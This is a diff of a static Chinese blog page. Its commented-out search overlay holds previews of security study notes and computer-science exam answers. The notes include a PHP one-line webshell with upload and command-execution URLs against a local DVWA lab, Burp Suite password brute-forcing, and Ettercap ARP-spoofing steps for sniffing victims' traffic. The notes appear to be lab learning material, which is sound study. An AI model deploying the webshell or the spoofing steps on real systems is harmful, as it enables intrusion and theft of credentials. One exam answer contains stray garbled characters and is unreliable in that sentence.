+      lightBox.style = `height: 100%; opacity: 1; background-color: rgba(0, 0, 0, 0.5);cursor: zoom-out;`;
+      lightImg.style = `width: ${width}px; border: 1px solid #fff; border-radius: 2px;`;
+      lightImg.onclick = function () {
+        lightBox.style = '';
+        this.remove();
+      }
+      lightBox.append(lightImg);
+    }
+  })
+</script>
+  </div>
+</body>
+<input hidden id="copy" />
+<script>
+  //拿来主义(真香)^_^，Clipboard 实现摘自掘金 https://juejin.im/post/5aefeb6e6fb9a07aa43c20af
+  window.Clipboard = (function (window, document, navigator) {
+    var textArea,
+      copy;
+
+    // 判断是不是ios端
+    function isOS() {
+      return navigator.userAgent.match(/ipad|iphone/i);
+    }
+    //创建文本元素
+    function createTextArea(text) {
+      textArea = document.createElement('textArea');
+      textArea.value = text;
+      textArea.style.width = 0;
+      textArea.style.height = 0;
+      textArea.clientHeight = 0;
+      textArea.clientWidth = 0;
+      document.body.appendChild(textArea);
+    }
+    //选择内容
+    function selectText() {
+      var range,
+        selection;
+
+      if (isOS()) {
+        range = document.createRange();
+        range.selectNodeContents(textArea);
+        selection = window.getSelection();
+        selection.removeAllRanges();
+        selection.addRange(range);
+        textArea.setSelectionRange(0, 999999);
+      } else {
+        textArea.select();
+      }
+    }
+
+    //复制到剪贴板
+    function copyToClipboard() {
+      try {
+        document.execCommand("Copy")
+      } catch (err) {
+        alert("复制错误！请手动复制！")
+      }
+      document.body.removeChild(textArea);
+    }
+
+    copy = function (text) {
+      createTextArea(text);
+      selectText();
+      copyToClipboard();
+    };
+
+    return {
+      copy: copy
+    };
+  })(window, document, navigator);
+
+  function copyCode(e) {
+    if (e.srcElement.tagName === 'SPAN' && e.srcElement.classList.contains('copy-code')) {
+      let code = e.currentTarget.querySelector('code');
+      var text = code.innerText;
+      if (e.srcElement.textContent === '复制成功') {
+        console.log('复制操作频率过高');
+        return;
+      }
+      e.srcElement.textContent = '复制成功';
+      (function (elem) {
+        setTimeout(() => {
+          if (elem.textContent === '复制成功') {
+            elem.textContent = '复制代码'
+          }
+        }, 1000);
+      })(e.srcElement)
+      Clipboard.copy(text);
+    }
+  }
+
+  let pres = document.querySelectorAll('pre');
+  pres.forEach(pre => {
+    let code = pre.querySelector('code');
+    let copyElem = document.createElement('span');
+    copyElem.classList.add('copy-code');
+    copyElem.textContent = '复制代码';
+    pre.appendChild(copyElem);
+    pre.onclick = copyCode
+  })
+</script>
+<script src="/media/js/motion.js"></script>
+
+<script src="https://cdn.jsdelivr.net/gh/cferdinandi/smooth-scroll/dist/smooth-scroll.polyfills.min.js"></script>
+<script>
+  var scroll = new SmoothScroll('a[href*="#"]', {
+    speed: 500
+  });
+</script>
+
+<!-- <div class="search-mask" id="search_mask">
+  <div class="search-box">
+    <div class="search-title">
+      <i class="fa fa-search"></i>
+      <div class="input-box">
+        <input type="text" placeholder="搜索">
+      </div>
+      <i class="fa fa-times-circle"></i>
+    </div>
+    <div class="result">
+      
+      <div class="item">
+        <a class="result-title" href="https://tjx158589.github.io/post/74DdnBfLO/"" data-c="
+          &lt;h1 id=&#34;一句话木马webshell&#34;&gt;一句话木马Webshell&lt;/h1&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php @eval($_GET[command]);?&amp;gt;
+
+&amp;lt;?php @eval($_POST[command]);?&amp;gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;木马上传&#34;&gt;木马上传&lt;/h4&gt;
+&lt;blockquote&gt;
+&lt;p&gt;制作木马php&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ggksuhtvthj30vo0kaam7.jpg&#34; alt=&#34;image-20200709162716117&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;!-- more --&gt;
+&lt;img src=&#34;/Users/oo/Library/Application Support/typora-user-images/image-20200709162819750.png&#34; alt=&#34;image-20200709162819750&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;blockquote&gt;
+&lt;p&gt;上传php文件&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ggkszvu6wmj31f80rcwhv.jpg&#34; alt=&#34;image-20200709163228706&#34; style=&#34;zoom: 33%;&#34; /&gt;
+&lt;blockquote&gt;
+&lt;p&gt;检查是否上传成功&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;页面为空白说明php被服务器解析成功&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ggkt3wqvq3j31tc0o8go8.jpg&#34; alt=&#34;image-20200709163621768&#34; style=&#34;zoom: 33%;&#34; /&gt;
+&lt;h4 id=&#34;木马使用&#34;&gt;木马使用&lt;/h4&gt;
+&lt;blockquote&gt;
+&lt;p&gt;木马利用方法1&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;http://127.0.0.1/hackable/uploads/shell.php?command=phpinfo();//打印服务器信息
+
+http://127.0.0.1/hackable/uploads/shell.php?command=system(%27ls%27);//终端   ls
+
+&lt;/code&gt;&lt;/pre&gt;
+">一句话木马Webshell</a>
+      </div>
+      
+      <div class="item">
+        <a class="result-title" href="https://tjx158589.github.io/post/4tkAOajCp/"" data-c="
+          &lt;h3 id=&#34;1-火狐代理安装&#34;&gt;1、火狐代理安装&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;firefox - 右上角菜单 - Add-ons - 搜索Proxy SwitchyOmega - 安装&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1ggkm3nd4xjj30vm0g2myc.jpg&#34; alt=&#34;image-20200709123227751&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;/blockquote&gt;
+&lt;!-- more --&gt;
+&lt;h5 id=&#34;火狐中文设置&#34;&gt;火狐中文设置&lt;/h5&gt;
+&lt;pre&gt;&lt;code&gt;preference - language - search more language - chinese - add - 选择 - 重启浏览器
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;1.保证DVWA设置为low安全等级&lt;/p&gt;
+&lt;p&gt;2.拦截正确的数据包 要在数据包中能看到自己输入的用户名密码值&lt;/p&gt;
+&lt;p&gt;3.发送到Intruder 在position中clear add密码字段&lt;/p&gt;
+&lt;p&gt;4.load 载入txt文件&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;3-burp-suite-https-证书&#34;&gt;3、burp suite   https 证书&lt;/h3&gt;
+&lt;h5 id=&#34;1-下载证书&#34;&gt;1、下载证书&lt;/h5&gt;
+&lt;blockquote&gt;
+&lt;p&gt;proxy模式   访问http://burp/&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ggkp31xaqxj31340lktag.jpg&#34; alt=&#34;image-20200709141708731&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h5 id=&#34;2-证书安装&#34;&gt;2、证书安装&lt;/h5&gt;
+&lt;blockquote&gt;
+&lt;p&gt;选择Open menu -&amp;gt;Preferences -&amp;gt;Privacy &amp;amp; Security下的View Certificates&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ggkp59nm3fj31e50u0the.jpg&#34; alt=&#34;image-20200709141915455&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;blockquote&gt;
+&lt;p&gt;导入证书&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ggkp64qp25j30wb0u0n06.jpg&#34; alt=&#34;image-20200709142005940&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+">burpsuite 抓包练习</a>
+      </div>
+      
+      <div class="item">
+        <a class="result-title" href="https://tjx158589.github.io/post/dg16Ph5CE/"" data-c="
+          &lt;h1 id=&#34;driftnet学习笔记&#34;&gt;Driftnet学习笔记&lt;/h1&gt;
+&lt;h2 id=&#34;一-工具介绍&#34;&gt;一、工具介绍&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;driftnet是一款简单而使用的图片捕获工具，可以很方便的在网络数据包中抓取图片。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;这次用到这个工具的原因是与 ettercap 相配合，抓去被害人浏览的图片。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;此篇应与 ettercap ARP欺骗相互配合观看。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;命令介绍&#34;&gt;命令介绍&lt;/h4&gt;
+&lt;h4 id=&#34;命令原型&#34;&gt;命令原型&lt;/h4&gt;
+&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;driftnet  [options]  [filter code] 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;!-- more --&gt;
+&lt;p&gt;&lt;strong&gt;参数命令&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;-b&lt;/code&gt; ：捕获到新的图片时发出嘟嘟声&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-i interface&lt;/code&gt; ：选择监听接口&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-f file&lt;/code&gt;：读取一个指定pcap数据包中的图片&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-p&lt;/code&gt; ：不让所监听的接口使用混杂模式&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-a&lt;/code&gt; ：后台模式：将捕获的图片保存到目录中（不会显示在屏幕上）&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-m number&lt;/code&gt; ：指定保存图片数的数目&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-d directory&lt;/code&gt; ：指定保存图片的路径&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-x prefix&lt;/code&gt;：指定保存图片的前缀名&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4 id=&#34;命令示例&#34;&gt;命令示例&lt;/h4&gt;
+&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;# driftnet -i eth0 -d /root/ 
+
+/*
+
+   因为我们是配合ettercap 进行ARP欺骗，所以所有的被害者流量都会从
+
+  我方端口经过（有线），所以端口为eth0.
+
+*/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;二-ettercap-进行arp欺骗-实验笔记&#34;&gt;二、Ettercap 进行ARP欺骗 实验笔记&lt;/h2&gt;
+&lt;h3 id=&#34;实验需求&#34;&gt;实验需求&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;​    攻击机与被攻击机位于同一局域网内&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;​    此实验中，攻击机为 Kali Linux&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;​    被攻击机为 苹果手机 与 Win7虚拟机&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;实验步骤&#34;&gt;实验步骤&lt;/h3&gt;
+&lt;h5 id=&#34;打开-ettercap&#34;&gt;打开 Ettercap&lt;/h5&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Ettercap 支持&lt;em&gt;命令行&lt;/em&gt;与&lt;em&gt;图形界面&lt;/em&gt; 双模式，但其图形界面很优美，故我们选用图形界面。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;# ettercap -G 
+
+ /* 该命令打开 Ettercap 的（GTK+ GUI）*/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5 id=&#34;确定监听网卡&#34;&gt;确定监听网卡&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;选择 Sniff —- Unified-sniffing ，然后选择网卡。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;在这里，我们用有线攻击局域网内目标。故选择 eth0。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;当然我们还可以，点击下拉箭头，打开网卡备选。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;点击确定。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;扫描局域网内全部主机&#34;&gt;扫描局域网内全部主机&lt;/h5&gt;
+&lt;p&gt;​	 Hosts — Scan for hosts — Hosts list。这时，就可以看到局域网内所有的主机。&lt;/p&gt;
+&lt;h5 id=&#34;选定目标&#34;&gt;选定目标&lt;/h5&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;在列表里面，选定目标主机，然后点add to target 1,将目标主机添加到目标1;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;在列表里面，选定路由，点add to target 2,将路由添加到目标2：&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;PS.路由就是我们的网关，可以用 ifconfig 来查看。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;h5 id=&#34;选择攻击方式&#34;&gt;选择攻击方式&lt;/h5&gt;
+&lt;blockquote&gt;
+&lt;p&gt;然后点 mitm — arp posoning ，勾选 sniff remote connections：&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h5 id=&#34;开始攻击&#34;&gt;开始攻击&lt;/h5&gt;
+&lt;blockquote&gt;
+&lt;p&gt;点击start — start sniffing开始监听。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h5 id=&#34;密码解析&#34;&gt;密码解析&lt;/h5&gt;
+&lt;blockquote&gt;
+&lt;p&gt;其中如果被劫持的主机访问一些比较明显的用户名和密码，Ettercap就会自己显现在屏幕上。但是，现在的网络环境下，很少是明文传输。很多都是MD5加密。可以在线破解。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4 id=&#34;拓展&#34;&gt;拓展&lt;/h4&gt;
+&lt;h5 id=&#34;获取图片流&#34;&gt;获取图片流&lt;/h5&gt;
+&lt;blockquote&gt;
+&lt;p&gt;我们用 driftnet 工具。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;driftnet -i eth0 -d /root/ 
+&lt;/code&gt;&lt;/pre&gt;
+">Driftnet学习笔记</a>
+      </div>
+      
+      <div class="item">
+        <a class="result-title" href="https://tjx158589.github.io/post/elbtsnl8g/"" data-c="
+          &lt;h2 id=&#34;第一章&#34;&gt;第一章&lt;/h2&gt;
+&lt;h4 id=&#34;讲述计算机的发展历程&#34;&gt;讲述计算机的发展历程&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;机械计算器（1930以前）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;电子计算机的诞生（1930-1950）&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;早起电子计算机&lt;/li&gt;
+&lt;li&gt;基于冯洛伊曼模型的计算机&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;计算机的诞生（1950—今）&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;计算机有哪些特点&#34;&gt;计算机有哪些特点&lt;/h4&gt;
+&lt;!-- more --&gt;
+&lt;ol&gt;
+&lt;li&gt;快速的运算能力&lt;/li&gt;
+&lt;li&gt;足够高的计算精度&lt;/li&gt;
+&lt;li&gt;复杂的逻辑判断能力&lt;/li&gt;
+&lt;li&gt;按程序自动工作的能力&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;简述计算机科学的定义及其根本问题&#34;&gt;简述计算机科学的定义及其根本问题&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;定义：信息处理的机器。信息的传输、储存、加工的机器&lt;/li&gt;
+&lt;li&gt;根本问题
+&lt;ol&gt;
+&lt;li&gt;理论：理论是数学科学的根本。&lt;/li&gt;
+&lt;li&gt;抽象：抽象（模型化）是自然科学的根本。&lt;/li&gt;
+&lt;li&gt;设计：设计是工程的根本。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;简述计算机科学与技术专业知识体系&#34;&gt;简述计算机科学与技术专业知识体系&lt;/h4&gt;
+&lt;p&gt;​		数学基础、编程语言、编程思想、数据结构、算法能力、计算机网络、操作系统、数据库、编译原理、计算机组成&lt;/p&gt;
+&lt;h4 id=&#34;简述计算机科学与技术学科的三个学科形态&#34;&gt;简述计算机科学与技术学科的三个学科形态&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;理论：理论是数学科学的根本。&lt;/li&gt;
+&lt;li&gt;抽象：抽象（模型化）是自然科学的根本。&lt;/li&gt;
+&lt;li&gt;设计：设计是工程的根本。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;第二章&#34;&gt;第二章&lt;/h2&gt;
+&lt;h4 id=&#34;简述图灵机模型的基本思想&#34;&gt;简述图灵机模型的基本思想&lt;/h4&gt;
+&lt;p&gt;图灵的基本思想是用机器来模拟人们用纸笔进行数学运算的过程，他把这样的过程看作下列两种简单的动作:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;在纸上写上或擦除某个符号;&lt;/li&gt;
+&lt;li&gt;把注意力从纸的一个位置移动到另一个位置;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;简述冯诺依曼型计算机的基本思想&#34;&gt;简述冯诺依曼型计算机的基本思想&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;计算机应该由运算器、控制器、存储器、输入设备和输出设备五个基本部件组成。&lt;/li&gt;
+&lt;li&gt;各个基本部件的功能是：
+&lt;ol&gt;
+&lt;li&gt;存储器不仅能存放数据，也能存放指令，形式上两者没有区别，但计算机应能区分数据还是指令；&lt;/li&gt;
+&lt;li&gt;控制器应能自动取出指令来执行&lt;/li&gt;
+&lt;li&gt;运算器应能进行加减乘除四种基本算术运算，并且也能进行一些逻辑运算和附加运算；&lt;/li&gt;
+&lt;li&gt;操作人员可以通过输入设备、输出设备和主机进行通信。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;内部以二进制表示指令和数据。每条指令由操作码和地址码两部分组成。操作码指出操作类型（加、减法、跳转、传送等），地址码指出操作数的地址。由一串指令组成程序。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;4.采用“存储程序”工作方式。&lt;/p&gt;
+&lt;h4 id=&#34;汉字编码有哪几类列出几种常见的输入码&#34;&gt;汉字编码有哪几类？列出几种常见的输入码&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;外码、交换码、机内码、字形码和地址码&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;常见输入码&lt;/p&gt;
+&lt;p&gt;拼音码、五笔字型码、自然码、表形码、认知码、区位码和电报码&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;定点表示法和浮点表示法各有什么特点&#34;&gt;定点表示法和浮点表示法各有什么特点&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;定点表示法：指小数点在数中的位置是固定不变的，通常有定点整数和定点小数。&lt;/li&gt;
+&lt;li&gt;浮点表示法：浮点数中小数点的位置是不固定的，用阶码和尾数来表示。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;为什么说计算机中用补码做加减运算最简单&#34;&gt;为什么说计算机中用补码做加减运算最简单&lt;/h4&gt;
+&lt;p&gt;因为使用补码可以只是使用加法运算就可以实现加减运算&lt;/p&gt;
+&lt;h4 id=&#34;收集资料了解图灵机模型的主要应用领域有哪些&#34;&gt;收集资料，了解图灵机模型的主要应用领域有哪些&lt;/h4&gt;
+&lt;h2 id=&#34;第三章&#34;&gt;第三章&lt;/h2&gt;
+&lt;h4 id=&#34;计算机系统由哪几大部分组成各部分有什么功能&#34;&gt;计算机系统由哪几大部分组成？各部分有什么功能？&lt;/h4&gt;
+&lt;p&gt;1、控制器：计算机的控制系统&lt;/p&gt;
+&lt;p&gt;2、运算器：计算机的运算系统&lt;/p&gt;
+&lt;p&gt;3、存储器：计算机存储系统&lt;/p&gt;
+&lt;p&gt;4、输入设备&lt;/p&gt;
+&lt;p&gt;5、输出设备&lt;/p&gt;
+&lt;h4 id=&#34;中央处理器在计算机工作过程中起什么作用&#34;&gt;中央处理器在计算机工作过程中起什么作用？&lt;/h4&gt;
+&lt;p&gt;运算和控制核心，是信息处理、程序运行的最终执行单元。&lt;/p&gt;
+&lt;h4 id=&#34;什么是输入输出设备举例常见的输入输出设备&#34;&gt;什么是输入输出设备？举例常见的输入输出设备。&lt;/h4&gt;
+&lt;p&gt;是数据处理系统的关键外部设备之一，可以和计算机本体进行交互使用。&lt;/p&gt;
+&lt;p&gt;输入设备：向计算机输入数据和信息的设备&lt;/p&gt;
+&lt;p&gt;输出设备：把计算或处理的结果或中间结果以人能识别的各种形式&lt;/p&gt;
+&lt;p&gt;鼠标、键盘、显示屏、音响&lt;/p&gt;
+&lt;h4 id=&#34;冯诺依曼体系结构的计算机由哪几大部分组成它的工作原理是什么&#34;&gt;冯诺依曼体系结构的计算机由哪几大部分组成？它的工作原理是什么？&lt;/h4&gt;
+&lt;p&gt;1、输入数据和程序的“输入设备”；&lt;/p&gt;
+&lt;p&gt;2、记忆程序和数据的“存储器”；&lt;/p&gt;
+&lt;p&gt;3、完成数据加工处理的“运算器”；&lt;/p&gt;
+&lt;p&gt;4、控制程序执行的“控制器”；&lt;/p&gt;
+&lt;p&gt;5、输出处理结果的“输出设备”。&lt;/p&gt;
+&lt;p&gt;工作原理主要分为存储程序和程序控制，预先要把控制计算机如何进行操作的指令序列【称为程序】和原始数据通过输入设备输送到计算机内存中，每一条指令中明确规定了计算机从哪个地址取数，进行什么操作，然后送到什么地址去等步骤。&lt;/p&gt;
+&lt;h4 id=&#34;现代提出的非冯诺依曼计算机体系结构有哪些&#34;&gt;现代提出的非冯诺依曼计算机体系结构有哪些？&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;零指令集计算机&lt;/li&gt;
+&lt;li&gt;哈佛架构&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;系统总线按功能分可以分为哪几类各有什么功能&#34;&gt;系统总线按功能分可以分为哪几类？各有什么功能？&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;数据总线：在CPU与RAM之间来回传送需要处理或是需要储存的数据。&lt;/li&gt;
+&lt;li&gt;地址总线：用来指定在RAM（Random Access Memory）之中储存的数据的地址。&lt;/li&gt;
+&lt;li&gt;控制总线：将微处理器控制单元（Control Unit）的信号，传送到周边设备。&lt;/li&gt;
+&lt;li&gt;扩展总线：外部设备和计算机主机进行数据通信的总线，例如ISA总线，PCI总线。&lt;/li&gt;
+&lt;li&gt;局部总线&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;简述什么是操作系统-它的功能有哪些&#34;&gt;简述什么是操作系统。它的功能有哪些？&lt;/h4&gt;
+&lt;p&gt;是管理计算机硬件]与软件资源的计算机程序。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;进程管理&lt;/li&gt;
+&lt;li&gt;存储管理&lt;/li&gt;
+&lt;li&gt;设备管理&lt;/li&gt;
+&lt;li&gt;文件管理&lt;/li&gt;
+&lt;li&gt;作业管理&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;什么是软件危机什么是软件工程软件工程过程是什么&#34;&gt;什么是软件危机？什么是软件工程？软件工程过程是什么？&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;指落后的软件生产方式无法满足迅速增长的计算机软件需求，从而导致软件开发与维护过程中出现一系列严重问题的现象。&lt;/li&gt;
+&lt;li&gt;软件工程是一门研究用工程化方法构建和维护有效的、实用的和高质量的软件的学科。它涉及程序设计语言、数据库、软件开发工具、系统平台、标准、设计模式等方面。&lt;/li&gt;
+&lt;li&gt;有瀑布模型、螺旋模型、增量模型、原型模型和RUP模型。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;软件工程遵循哪些原则&#34;&gt;软件工程遵循哪些原则&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;确定性：软件开发过程中所有概念的表达应是确定的、无歧义性的、规范的。&lt;/li&gt;
+&lt;li&gt;一致性：整个软件系统使用一致的概念、符号和术语。&lt;/li&gt;
+&lt;li&gt;完备性：软件系统不丢失任何重要成分，可以完全实现系统所要求功能的程度。&lt;/li&gt;
+&lt;li&gt;可验证性：易于检查、测试、评审，确保系统的正确性。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;常见程序设计语言有哪几种各有什么特点&#34;&gt;常见程序设计语言有哪几种？各有什么特点？&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;机器语言：是最低级的语言，是由二进制码组成，是最早期的一种程序语言&lt;/li&gt;
+&lt;li&gt;汇编语言：用助记符和地址符代替了二进制码，更易于编写&lt;/li&gt;
+&lt;li&gt;高级语言：相对于汇编语言又上升了一步，更接近于自然语言，如C语言、Pascal、Java、C#等都是高级语言。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;第四章&#34;&gt;第四章&lt;/h2&gt;
+&lt;h4 id=&#34;欧拉是如何对格尼斯堡七桥问题进行抽象的&#34;&gt;欧拉是如何对”格尼斯堡七桥问题“进行抽象的？&lt;/h4&gt;
+&lt;p&gt;原始问题：“是否能从某块陆地出发，经过每座桥恰好一次，最后回到出发点？”&lt;br&gt;
+抽象成数据模型：“是否能从图中的某个图出发，经过每条边恰好一次，最后回到出发节点？”&lt;br&gt;
+欧拉转化：“该图是否存在欧拉回路？”&lt;/p&gt;
+&lt;h4 id=&#34;简述欧拉回路与哈密尔顿回路的区别&#34;&gt;简述”欧拉回路“与”哈密尔顿回路“的区别&lt;/h4&gt;
+&lt;p&gt;从一个顶点出发每条边恰好经过一次，再回到出发点的巡回（闭通路）叫欧拉巡回，含有欧拉巡回的图叫欧拉图。&lt;/p&gt;
+&lt;p&gt;从一个顶点出发每个顶点恰好经过一次，再回到出发点的圈叫哈密尔顿圈，含哈密尔顿圈的图叫哈密尔顿图&lt;/p&gt;
+&lt;p&gt;区别欧拉回路是恰好每条边都经过一次，而哈密尔顿是恰好每个顶点都经过&lt;/p&gt;
+&lt;h4 id=&#34;以梵天塔问题为例说明理论上可行的计算问题实际上并不一定能行&#34;&gt;以”梵天塔问题“为例，说明理论上可行的计算问题实际上并不一定能行&lt;/h4&gt;
+&lt;h4 id=&#34;什么是np问题并举例说明&#34;&gt;什么是NP问题？并举例说明。&lt;/h4&gt;
+&lt;p&gt;可以在多项式时间内验证的问题称为NP问题&lt;/p&gt;
+&lt;p&gt;举例：哈密尔顿回路问题、TSP问题、顶点覆盖问题&lt;/p&gt;
+&lt;h4 id=&#34;简述两军问题&#34;&gt;简述”两军问题“&lt;/h4&gt;
+&lt;p&gt;两个将军 A1 和 A2 决定攻打同一个敌人 B ，任一方都没有敌人强大，所以只有共同进攻才有胜算。敌军正好位于两个将军之间，意味着信使可能会被敌军抓住。两军问题指的就是在这样的条件下两个将军如何就是否进攻达成共识&lt;/p&gt;
+&lt;p&gt;网络中用TCP的三次握手来解决这个问题&lt;/p&gt;
+&lt;h4 id=&#34;举例说明计算机中的博弈问题&#34;&gt;举例说明计算机中的博弈问题&lt;/h4&gt;
+&lt;p&gt;博弈树搜索&lt;/p&gt;
+&lt;p&gt;中国象棋机器博弈&lt;/p&gt;
+&lt;h4 id=&#34;如何从哲学角度反映人工智能的本质&#34;&gt;如何从哲学角度反映人工智能的本质&lt;/h4&gt;
+&lt;p&gt;图灵测试揭示计算本质那样揭示人类思维的本质，即能行思维。&lt;br&gt;
+中文屋子，形式化计算机仅有的语法，没有语意。因此，计算机永远也不可能代替人脑。&lt;/p&gt;
+&lt;h2 id=&#34;第五章&#34;&gt;第五章&lt;/h2&gt;
+&lt;h4 id=&#34;什么是算法算法有哪几种表达方法&#34;&gt;什么是算法？算法有哪几种表达方法？&lt;/h4&gt;
+&lt;p&gt;算法（baiAlgorithm）是指解题du方案的准确而完zhi整的描述，是一系列解决dao问题的清晰指令zhuan，算法代shu表着用系统的方法描述解决问题的策略机制。&lt;/p&gt;
+&lt;p&gt;自然语言、伪代码、流程图等表达&lt;/p&gt;
+&lt;h4 id=&#34;简述递归算法-回溯算法-贪心算法和分治算法的特点&#34;&gt;简述递归算法、回溯算法、贪心算法和分治算法的特点&lt;/h4&gt;
+&lt;h4 id=&#34;什么数据结构常用的数据结构有哪些&#34;&gt;什么数据结构？常用的数据结构有哪些？&lt;/h4&gt;
+&lt;p&gt;是计算机存储、组织数据的方式&lt;/p&gt;
+&lt;p&gt;链表、树、堆、栈图、数组等&lt;/p&gt;
+&lt;h4 id=&#34;简述数据库管理系统的发展历程&#34;&gt;简述数据库管理系统的发展历程&lt;/h4&gt;
